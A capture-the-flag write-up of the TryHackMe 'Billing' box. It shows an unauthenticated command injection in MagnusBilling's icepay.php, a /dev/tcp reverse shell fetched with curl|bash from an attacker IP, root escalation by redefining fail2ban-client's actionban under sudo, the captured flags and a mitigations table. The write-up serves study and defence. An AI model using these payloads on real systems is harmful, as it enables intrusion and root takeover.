```
 ██████╗ ██╗██╗     ██╗     ██╗███╗   ██╗ ██████╗
 ██╔══██╗██║██║     ██║     ██║████╗  ██║██╔════╝
 ██████╔╝██║██║     ██║     ██║██╔██╗ ██║██║  ███╗
 ██╔══██╗██║██║     ██║     ██║██║╚██╗██║██║   ██║
 ██████╔╝██║███████╗███████╗██║██║ ╚████║╚██████╔╝
 ╚═════╝ ╚═╝╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝
              TryHackMe — Billing
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-24 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Medium | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~12 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan — SSH (22), HTTP (80, MagnusBilling), MySQL (3306), Asterisk Call Manager (5038)
- [x] Feroxbuster — full MagnusBilling install enumerated, nothing custom found
- [x] Identified unauthenticated command injection in `icepay.php` (`democ` parameter)
- [x] Injected `curl | bash` payload to fetch and execute a reverse shell
- [x] Caught shell as `asterisk`
- [x] Retrieved user flag from `/home/magnus/user.txt`
- [x] `sudo -l` → `fail2ban-client` with NOPASSWD
- [x] Attempted direct config file edits — blocked by file permissions
- [x] Used `fail2ban-client set ... actionban` to define a custom ban action
- [x] Triggered the action via `banip` → command executed as root
- [x] Iterated the payload (file copy, SUID bash, reverse shell) until landing a root shell
- [x] Retrieved root flag

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap — port scanning and service detection
- 🕷️ Feroxbuster — web directory enumeration
- 💉 Command injection — unauthenticated parameter in MagnusBilling's icepay module
- 🐚 Netcat — multiple reverse shell listeners
- 🛡️ fail2ban-client — GTFOBins-style sudo escalation via custom ban actions

---

## ⚡ TL;DR

MagnusBilling's `icepay.php` accepts a `democ` parameter that gets passed unsanitised into a shell context — a single GET request with a chained `curl | bash` payload landed a shell as `asterisk`. From there, `sudo` grants NOPASSWD access to `fail2ban-client`, which can define and trigger custom ban actions. Setting the SSH jail's `actionban` to an arbitrary command and then triggering a ban event runs that command as root.

---

## 📖 Introduction

Today's target is **Billing** — a box built around MagnusBilling, an open-source VoIP billing platform that pairs nicely with the Asterisk PBX service also running here. The foothold is a classic unauthenticated command injection in a payment gateway integration file — the kind of vulnerability that surfaces when third-party payment modules accept user input without validating it. The escalation is the more interesting half: `fail2ban`, a tool whose entire purpose is *blocking* malicious activity, becomes the mechanism for *creating* it once an attacker can redefine what happens when a ban fires.

### Prerequisites

Readers are assumed to know:

- What command injection is and how chained shell operators (`;`, `|`, `&&`) exploit unsanitised parameters
- What fail2ban is and how jails/actions/filters relate to each other
- How `fail2ban-client set <jail> action <action> actionban <command>` redefines what runs on a ban event
- Basic reverse shell staging via `curl | bash`

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

```bash
rustscan -a 10.49.178.53 -r 1-65535 --ulimit 5000 -b 500 -t 2000 -- -Pn -sV -sC -T4
```

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 9.2p1 Debian |
| 80/tcp | HTTP | Apache 2.4.62 — MagnusBilling |
| 3306/tcp | MySQL | MariaDB 10.3.23 or earlier |
| 5038/tcp | Asterisk | Asterisk Call Manager 2.10.6 |

A telecom-flavoured stack: MagnusBilling (VoIP billing software) sits on top of Asterisk (the PBX it bills for), backed by MariaDB. The combination is the box's whole theme.

### Web Directory Enumeration

```bash
feroxbuster -u http://10.49.178.53/ -w /usr/share/wordlists/dirb/common.txt -x php,xt,html
```

The scan surfaces the entire MagnusBilling installation structure — `lib/`, `fpdf/`, multiple payment gateway integration directories (`icepay/`, `mercadopago/`, `stripe/`, `anet/`, `PlacetoPay/`). Nothing custom was added to this install; it's the stock application. The payment gateway integrations are the most interesting attack surface — third-party billing modules historically carry more vulnerabilities than the application core, since they're maintained separately and often less rigorously reviewed.

---

## 🚪 Foothold

*(~10 mins into the box)*

### Unauthenticated Command Injection — icepay.php

**What's happening here?** MagnusBilling's IcePay payment gateway integration accepts a `democ` parameter. Rather than validating or escaping this input, the application passes it into a shell execution context — likely building a command string for a payment verification or demo-mode check. Chaining additional shell commands via `;` after a benign-looking value (`/dev/null`) lets arbitrary commands ride along.

*Preparing a payload script on the attacking machine:*

```bash
echo 'bash -i >& /dev/tcp/192.168.134.217/4444 0>&1' > shell.sh
```

*The injection — chaining a `curl | bash` fetch-and-execute after a harmless `/dev/null` argument:*

```
http://10.49.178.53/mbilling/lib/icepay/icepay.php?democ=/dev/null;curl%20http://192.168.134.217/shell.sh%20|%20bash;id
```

*Listener:*

```bash
nc -nvlp 4444
```

```
connect to [192.168.134.217] from (UNKNOWN) [10.49.178.53] 53710
asterisk@ip-10-49-178-53:/var/www/html/mbilling/lib/icepay$
```

Shell landed as `asterisk` — the system account running the Asterisk/MagnusBilling services.

---

## 🐚 Shell / Access

```bash
cd /home/magnus
cat user.txt
# THM{4a6831d5f124b25eefb1e92e0f0da4ca}
```

---

## 📈 Escalation

*(~25 mins into the box)*

### sudo fail2ban-client

```bash
sudo -l
```

```
User asterisk may run the following commands on ip-10-49-178-53:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

**What is fail2ban?** A log-monitoring service that bans IPs exhibiting malicious behaviour (repeated failed SSH logins, for example) by dynamically inserting firewall rules. Its behaviour is governed by *jails* (which log files to watch, for which patterns) and *actions* (what to actually do when a ban triggers — typically run an `iptables` command). The `actionban` setting defines the exact shell command executed when a ban fires.

The straightforward move — directly editing `/etc/fail2ban/action.d/*.conf` files — was blocked by file ownership (`root:root`, not writable by `asterisk`). But `fail2ban-client` itself, running as root via `sudo`, can redefine action settings live without touching any file on disk.

*Checking active jails:*

```bash
sudo /usr/bin/fail2ban-client status
```

```
Jail list: ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager,
           ip-blacklist, mbilling_ddos, mbilling_login, sshd
```

*Redefining the `sshd` jail's ban action to run an arbitrary command:*

```bash
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban \
  "/bin/bash -c 'curl http://192.168.134.217:4443/shell.sh | bash'"
```

This doesn't execute anything yet — it just rewrites what *will* run the next time the `sshd` jail issues a ban.

*Triggering a ban manually to fire the new action immediately:*

```bash
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```

Banning a loopback address as the trigger condition causes `fail2ban` to invoke the configured `actionban` command — which now points at the attacker-controlled payload — running as root, since `fail2ban` itself operates with root privileges.

*Catching the resulting connection:*

```bash
nc -nvlp 4442
```

```
connect to [192.168.134.217] from (UNKNOWN) [10.49.178.53] 34872
root@ip-10-49-178-53:/# cat /root/root.txt
THM{33ad5b530e71a172648f424ec23fae60}
```

---

## 💥 Exploitation

The complete attack chain:

1. **Unauthenticated command injection** in `icepay.php`'s `democ` parameter → `curl | bash` payload → shell as `asterisk`
2. **`sudo fail2ban-client`** with NOPASSWD → redefined `sshd` jail's `actionban` to a reverse shell payload
3. **`fail2ban-client set sshd banip 127.0.0.1`** → triggered the ban → action ran as root → root shell → root flag

---

## 🐇 Rabbit Holes

### Direct Config File Editing

The first instinct on seeing `sudo fail2ban-client` was to check whether the action config files themselves (`/etc/fail2ban/action.d/*.conf`) were writable — they weren't, all owned by root with standard permissions. This led to reading the `fail2ban-client` man page specifically, which revealed the `set <jail> action <action> actionban <command>` live-reconfiguration capability — a cleaner path than file editing would have been anyway, since it doesn't require any persistence on disk.

### Payload Iteration via actionban

Several `actionban` payloads were tried in sequence before landing on the working reverse shell: first an attempt to copy `root.txt` directly to a world-readable location, then copying and SUID-stamping `/bin/bash`, before settling on the `curl | bash` reverse shell. Each redefinition of `actionban` overwrites the previous one — only the most recently set command fires on the next trigger. The SUID bash copy attempt likely would have worked too, but the reverse shell path was more direct once verified functional.

### First Listener Catching the Raw curl Request Instead of the Payload

One `nc -nvlp 4443` session caught a literal `GET /shell.sh HTTP/1.1` request rather than executing as a shell — this was `curl` actually fetching the script content as expected, not a failure. The confusion was momentary: the listener that should be *serving* `shell.sh` was conflated with the listener that should be *catching* the resulting reverse shell connection. Running two separate listeners (one to serve the payload file, one to catch the callback) cleared it up.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `THM{4a6831d5f124b25eefb1e92e0f0da4ca}` | `/home/magnus/user.txt` |
| Root | `THM{33ad5b530e71a172648f424ec23fae60}` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Unauthenticated command injection in `icepay.php` | Critical | Update MagnusBilling to a patched version; never pass unsanitised request parameters into shell execution contexts; validate and allowlist all payment gateway callback parameters |
| `sudo fail2ban-client` with NOPASSWD | Critical | Never grant unrestricted `sudo` to `fail2ban-client` — its `set` subcommand allows arbitrary command execution via `actionban` redefinition; if automation requires fail2ban control, scope it to read-only subcommands only |
| Asterisk/web service account (`asterisk`) granted broad sudo rights | High | Service accounts should have the absolute minimum sudo footprint required; question why a web-facing service account needs any sudo access to system security tooling at all |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** Granting `sudo` access to a tool's *client* binary is not the same as granting access to only its "safe" read operations — `fail2ban-client`'s `set` subcommand can redefine the exact command that runs on a security event, turning a defensive tool into an arbitrary root code execution primitive. Always audit what a binary's full subcommand surface allows before assuming a "monitoring" or "status" tool is safe to grant via `sudo`.

---

## 🔁 If I Did It Again

Check the `fail2ban-client` man page for `set ... actionban` immediately upon seeing it in `sudo -l`, rather than first investigating direct config file writability — the live reconfiguration path was always going to be the more direct route, and recognising "client binary for a privileged daemon" as a potential reconfiguration vector is a pattern worth applying to other client/daemon pairs (systemctl, docker, etc.) on future boxes.

---

## 🔚 Changelog

*Last updated: 2026-06-24*

---

[↑ Back to top](#)
